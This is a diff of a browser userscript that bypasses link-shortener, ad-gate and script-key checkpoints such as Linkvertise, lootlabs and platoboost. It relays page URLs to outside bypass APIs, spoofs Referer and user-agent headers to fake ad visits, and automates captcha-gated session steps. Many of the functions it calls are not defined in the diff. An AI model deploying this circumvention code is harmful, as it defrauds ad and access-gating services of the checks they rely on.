+async function socialwolvez() {
+    try {
+        await sleep(2000); // Sleep for 10000 milliseconds (10 seconds)
+        const response = await fetch("https://api.bypass.vip/bypass?url=" + window.location.href);
+        const data = await response.json();
+        window.location.href = data.result;
+    } catch (e) {
+        await notification_failed();
+    }
+}
+
+async function socialunlock() {
+    try {
+        await sleep(2000); // Sleep for 10000 milliseconds (10 seconds)
+        const response = await fetch("https://api.bypass.vip/bypass?url=" + window.location.href);
+        const data = await response.json();
+        window.location.href = data.result;
+    } catch (e) {
+        await notification_failed();
+    }
+}
+
+async function rekonise() {
+    let $ = jQuery.noConflict();
+    let sPathname = window.location.pathname;
+    let sRedirectUrl = `https://api.rekonise.com/social-unlocks${sPathname}/unlock`;
+  
+    try {
+      // Request the redirect URL from rekonise's API
+      let data = await $.getJSON(sRedirectUrl);
+      let redirectUrl = data['url'];
+  
+      // Check if the URL starts with "https://keyrblx.com/getkey/"
+      if (redirectUrl.startsWith("https://keyrblx.com/getkey/")) {
+        console.log('Keyrblx URL detected. Waiting 10 seconds before redirecting...');
+        // Delay redirection by 10 seconds
+        await new Promise(resolve => setTimeout(resolve, 5000));
+      }
+  
+      // Redirect to the obtained URL
+      window.location.href = redirectUrl;
+    } catch (error) {
+      console.error('Error fetching redirect URL:', error);
+      await notification_failed();
+    }
+}
+
+async function letsboost() {
+    try {
+        await sleep(2000); // Sleep for 10000 milliseconds (10 seconds)
+        const response = await fetch("https://ethos-testing.vercel.app/api/letsboost/bypass?link=" + window.location.href);
+        const data = await response.json();
+        window.location.href = data.bypassed;
+    } catch (e) {
+        await notification_failed();
+    }
+}
+
+async function boostink() {
+    try {
+        await sleep(2000); // Sleep for 10000 milliseconds (10 seconds)
+        const response = await fetch("https://api.bypass.vip/bypass?url=" + window.location.href);
+        const data = await response.json();
+        window.location.href = data.result;
+    } catch (e) {
+        await notification_failed();
+    }
+}
+
+async function gateway() {
+    // Extract the full path after /a/ (e.g., "54658?id=37885275682")
+    let fullPath = new URL(window.location.href).pathname.split('/a/')[1];
+
+    // Extract the {id} part (e.g., "54658")
+    let extractedId = fullPath.split('?')[0];
+
+    // Extract the id from query parameters (e.g., "37885275682")
+    let queryParamId = new URL(window.location.href).searchParams.get("id");
+
+    // List of ID types that should be bypassed
+    const WhitelistBypassTypes = ["8", "2569", "54658", "39097", "3170", "74946", "2", "73213", "82662", "87731"];
+
+    // Notification function for captcha or other messages
+    function notification(message, timeout) {
+        const config = {
+            text: message,
+            title: "INFO",
+            silent: true,
+        };
+        if (timeout) config.timeout = timeout;
+        GM_notification(config);
+    }
+
+    // Check if the extractedId is NOT in the whitelist
+    if (!WhitelistBypassTypes.includes(extractedId)) {
+        console.log(`Bypassing is disabled for ID type: ${extractedId}`);
+        return;
+    }
+
+    // Fetch the authenticator key using the extracted ID
+    let t = await (await fetch(`https://api-gateway.platoboost.com/v1/authenticators/${extractedId}/` + queryParamId)).json();
+
+    if (t.key) return;
+
+    // Check the checkpoint count
+    if (t.checkpointCount === 1) {
+        // Existing code when checkpointCount is 1
+        let tk = new URL(window.location.href).searchParams.get("tk");
+        if (tk) {
+            await sleep(3000);
+            await (await fetch(`https://api-gateway.platoboost.com/v1/sessions/auth/${extractedId}/${queryParamId}/${tk}`, {
+                method: "PUT"
+            })).json().then(async e => {
+                window.location.assign(e.redirect);
+            }).catch(e => {
+                alert(e);
+            });
+        } else {
+            let captcha = t.captcha;
+            let n = await fetch(`https://api-gateway.platoboost.com/v1/sessions/auth/${extractedId}/` + queryParamId, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    captcha: captcha ? await getTurnstileResponse() : "",
+                    type: captcha ? "Turnstile" : ""
+                })
+            });
+
+            // Check if the server responds with an error (e.g., 500 status for missing captcha)
+            if (n.status === 500) {
+                notification("Please solve the captcha.");
+                return;
+            }
+
+            n = await n.json();
+            await sleep(1000);
+
+            let decryptedUrl = await (await fetch(`https://bypass.rblx.workers.dev/delta-decrypt?url=${encodeURIComponent(n.redirect)}`)).text();
+            let rParam = new URL(decryptedUrl).searchParams.get("r");
+            let finalUrl = atob(rParam);
+
+            window.location.assign(finalUrl);
+        }
+    } else if (t.checkpointCount === 2) {
+        // New code when checkpointCount is 2
+        let o = new URL(window.location.href).searchParams.get("tk");
+        if (o) {
+            await sleep(5000);
+            await (await fetch(`https://api-gateway.platoboost.com/v1/sessions/auth/${extractedId}/${queryParamId}/${o}`, {
+                method: "PUT"
+            })).json().then(async e => {
+                if (console.log(e), e.redirect.includes("https://gateway.platoboost.com/")) {
+                    window.location.reload();
+                    return;
+                }
+                let t = await (await fetch(`https://bypass.rblx.workers.dev/delta-decrypt?url=${encodeURIComponent(e.redirect)}`)).text(),
+                    a = new URL(t).searchParams.get("r"),
+                    o = atob(a);
+                window.location.assign(o);
+            }).catch(e => {
+                alert(e);
+            });
+        } else {
+            let n = t.captcha;
+            let s = await fetch(`https://api-gateway.platoboost.com/v1/sessions/auth/${extractedId}/` + queryParamId, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    captcha: n ? await getTurnstileResponse() : "",
+                    type: n ? "Turnstile" : ""
+                })
+            });
+
+            // Check if the server responds with an error (e.g., 500 status for missing captcha)
+            if (s.status === 500) {
+                notification("Please solve the captcha.");
+                return;
+            }
+
+            s = await s.json();
+            await sleep(100);
+
+            let i = await (await fetch(`https://bypass.rblx.workers.dev/delta-decrypt?url=${encodeURIComponent(s.redirect)}`)).text(),
+                c = new URL(i).searchParams.get("r"),
+                r = atob(c);
+            window.location.assign(r);
+        }
+    } else if (t.checkpointCount === 3) {
+        // New code when checkpointCount is 3
+        let o = new URL(window.location.href).searchParams.get("tk");
+        if (o) {
+            await sleep(4000); // Adjust sleep duration as needed
+            await (await fetch(`https://api-gateway.platoboost.com/v1/sessions/auth/${extractedId}/${queryParamId}/${o}`, {
+                method: "PUT"
+            })).json().then(async e => {
+                if (console.log(e), e.redirect.includes("https://gateway.platoboost.com/")) {
+                    window.location.reload();
+                    return;
+                }
+                let t = await (await fetch(`https://bypass.rblx.workers.dev/delta-decrypt?url=${encodeURIComponent(e.redirect)}`)).text(),
+                    a = new URL(t).searchParams.get("r"),
+                    o = atob(a);
+                window.location.assign(o);
+            }).catch(e => {
+                alert(e);
+            });
+        } else {
+            let n = t.captcha;
+            let s = await fetch(`https://api-gateway.platoboost.com/v1/sessions/auth/${extractedId}/` + queryParamId, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    captcha: n ? await getTurnstileResponse() : "",
+                    type: n ? "Turnstile" : ""
+                })
+            });
+
+            // Check if the server responds with an error (e.g., 500 status for missing captcha)
+            if (s.status === 500) {
+                notification("Please solve the captcha.");
+                return;
+            }
+
+            s = await s.json();
+            await sleep(100);
+
+            let i = await (await fetch(`https://bypass.rblx.workers.dev/delta-decrypt?url=${encodeURIComponent(s.redirect)}`)).text(),
+                c = new URL(i).searchParams.get("r"),
+                r = atob(c);
+            window.location.assign(r);
+        }
+    }
+}
+
+async function notification_failed() {
+    function createNotification(message, duration = 1) {
+            const box = document.createElement('div');
+            box.style.position = 'fixed';
+            box.style.top = '20px'; // Di chuyển lên trên cao
+            box.style.right = '-300px'; // Start off-screen
+            box.style.padding = '15px';
+            box.style.backgroundColor = '#444';
+            box.style.color = '#fff';
+            box.style.fontSize = '14px';
+            box.style.borderRadius = '5px';
+            box.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.1)';
+            box.style.zIndex = '9999';
+            box.style.opacity = '0'; // Start hidden
+            box.style.transform = 'scale(0.8)'; // Start smaller
+            box.style.display = 'flex'; // Use flexbox for centering
+            box.style.flexDirection = 'column'; // Vertical alignment
+            box.style.alignItems = 'center'; // Center horizontally
+            box.style.justifyContent = 'center'; // Center vertically
+            box.style.textAlign = 'center'; // Center text
+            box.innerHTML = `<strong>Failded to bypass, please contact</strong>${message}`;
+
+            // Add keyframe animation styles
+            const style = document.createElement('style');
+            style.innerHTML = `
+                @keyframes bounceIn {
+                    0% { transform: scale(0.8); opacity: 0; right: -300px; }
+                    50% { transform: scale(1.1); right: 20px; opacity: 1; }
+                    100% { transform: scale(1); }
+                }
+                @keyframes pulse {
+                    0% { transform: scale(1); }
+                    50% { transform: scale(1.05); }
+                    100% { transform: scale(1); }
+                }
+                @keyframes slideOutShrink {
+                    0% { opacity: 1; right: 20px; transform: scale(1); }
+                    100% { opacity: 0; right: -300px; transform: scale(0.8); }
+                }
+            `;
+            document.head.appendChild(style);
+
+            // Append the box to the body
+            document.body.appendChild(box);
+
+            // Trigger the bounce-in animation
+            setTimeout(() => {
+                box.style.opacity = '1';
+                box.style.right = '20px'; // Slide in
+                box.style.transform = 'scale(1)';
+                box.style.animation = 'bounceIn 0.8s ease-out, pulse 1.5s ease-in-out infinite 1.2s'; // Bounce and pulse
+            }, 100);
+
+            // Remove the box with slide-out and shrink animation after the specified duration
+            setTimeout(() => {
+                box.style.animation = 'slideOutShrink 0.8s ease-in';
+                setTimeout(() => {
+                    box.remove();
+                }, 800); // Matches the slide-out animation time
+            }, duration);
+        }
+
+    // Example usage: show a notification
+    createNotification(`Bacon But Pro`, 30000);
+
+}
+
+async function lvdl() {
+    let e = new URL(window.location.href).searchParams.get("r");
+    if (e) {
+        adSpoof(atob(e), window.location.hostname);
+        return
+    }
+}
+function sleep(e) {
+    return new Promise(t => setTimeout(t, e))
+}
+
+function adSpoof(e, t) {
+    return new Promise((a, o) => {
+        GM_xmlhttpRequest({
+            method: "GET",
+            url: e,
+            anonymous: !0,
+            headers: {
+                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; GO3C Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.141 Mobile Safari/537.36",
+                accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                "accept-encoding": "gzip, deflate, br",
+                "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
+                "sec-ch-ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+                "sec-ch-ua-mobile": "?1",
+                "sec-ch-ua-platform": '"Android"',
+                referrer: t,
+                "sec-fetch-dest": "document",
+                "sec-fetch-mode": "navigate",
+                "sec-fetch-site": "none",
+                "sec-fetch-user": "?1",
+                "upgrade-insecure-requests": "1"
+            },
+            onload: function(t) {
+            },
+            onerror: function(e) {
+                console.log(e)
+            }
+        })
+    })
+}
+
+function linkvertiseSpoof(e) {
+    return new Promise((t, a) => {
+        GM.xmlHttpRequest({
+            method: "GET",
+            url: e,
+            headers: {
+                Referer: "https://linkvertise.com/"
+            },
+            onload: function(e) {
+                t(e.responseText)
+            },
+            onerror: function(e) {
+                a(e)
+            }
+        })
+    })
+}
+async function getTurnstileResponse() {
+    let e = "";
+    for (;;) {
+        try {
+            if (e = turnstile.getResponse()) break
+        } catch (t) {}
+        await sleep(1)
+    }
+    return turnstile.getResponse()
+}
+
+function base64decode(e) {
+    return atob(e = e.replace(/-/g, "+").replace(/_/g, "/"))
+}
+async function start() {
+    switch (window.location.hostname) {
+        case "mobile.codex.lol":
+            await codex();
+            break;
+        case "hohohubv-ac90f67762c4.herokuapp.com":
+            await hohohub();
+            break;
+        case "rekonise.com":
+            await rekonise();
+            break;
+        case "letsboost.net":
+            await letsboost();
+            break;
+        case "boost.ink":
+            await boostink()
+        case "mboost.me":
+            await mboost()
+    }
+}! function() {
+    "use strict";
+    if ("adshnk.com" === window.location.hostname || "adshrink.it" === window.location.hostname) {
+        let e = setInterval(() => {
+            "object" == typeof _sharedData && 0 in _sharedData && "destination" in _sharedData[0] ? (clearInterval(e), document.write(_sharedData[0].destination), window.location.replace(document.body.textContent)) : "undefined" != typeof ___reactjsD && "object" == typeof window[___reactjsD.o] && "string" == typeof window[___reactjsD.o].dest && (clearInterval(e), window.location.replace(window[___reactjsD.o].dest))
+        })
+    } else if ("socialwolvez.com" === window.location.hostname) fetch("https://us-central1-social-infra-prod.cloudfunctions.net/linksService/link/guid/" + location.pathname.substr(7)).then(e => (e.ok || window.location.reload(), e.json())).then(e => {
+        e && e.link && e.link.url ? window.location.replace(e.link.url) : window.location.reload()
+    }).catch(e => {
+        alert(e)
+    });
+    else if ("mboost.me" === window.location.hostname) try {
+        let s = document.querySelector('script[id="__NEXT_DATA__"]');
+        if (s) {
+            let i = JSON.parse(s.textContent);
+            i.props.pageProps.data.targeturl ? window.location.replace(i.props.pageProps.data.targeturl) : window.location.reload()
+        } else window.location.reload()
+    } catch (c) {
+        alert(c)
+    } else if ("leasurepartment.xyz" === window.location.hostname) {
+        async function r(e) {
+            return JSON.parse(atob(e))
+        }
+        async function l() {
+            let e = await r(function e(t) {
+                if (t = RegExp("[?&]" + encodeURIComponent(t) + "=([^&]*)").exec(location.search)) return decodeURIComponent(t[1])
+            }("cc"));
+            e && e.link ? window.location.replace(e.link) : window.location.reload()
+        }
+        l()
+    } let p = window.location.href;
+    p.includes("gateway.platoboost.com/a/") && gateway(),
+    p.includes("linkvertise.com/") && linkvertise(),
+    p.includes("work.ink/") && workink(),
+    p.includes("workink.net/") && workink(),
+    p.includes("socialwolvez.com/") && socialwolvez(),
+    p.includes("getkey.relzscript.xyz/") && relz(),
+    p.includes("social-unlock.com/") && socialunlock(),
+    p.includes("bot-hosting.net/panel/") && bothosting(),
+    p.includes("trigonevo.com/getkey/") && trigon_react(),
+    p.includes("trigonevo.fun/whitelist/") && trigon(),
+    p.includes("mboost.me/a/") && mboost(),
+    p.includes("sub2get.com/link?l=") && sub2get(),
+    p.includes("lootdest.com/s?") && lootlabs(),
+    p.includes("sub2unlock.com/") && sub2unlock(),
+    p.includes("links-loot.com/s?") && lootlabs(),
+    p.includes("linksloot.net/s?") && lootlabs(),
+    p.includes("lootdest.info/s?") && lootlabs(),
+    p.includes("lootdest.org/s?") && lootlabs(),
+    p.includes("loot-link.com/s?") && lootlabs(),
+    p.includes("loot-links.com/s?") && lootlabs(),
+    p.includes("lootlink.org/s?") && lootlabs(),
+    p.includes("paster.so/") && paster(),
+    p.includes("bstlar.com/") && bstlar(),
+    p.includes("keyrblx.com/getkey/") && keyrblx(),
+    p.includes("lootlinks.co/s?") && lootlabs();
+}(), lvdl(), start();
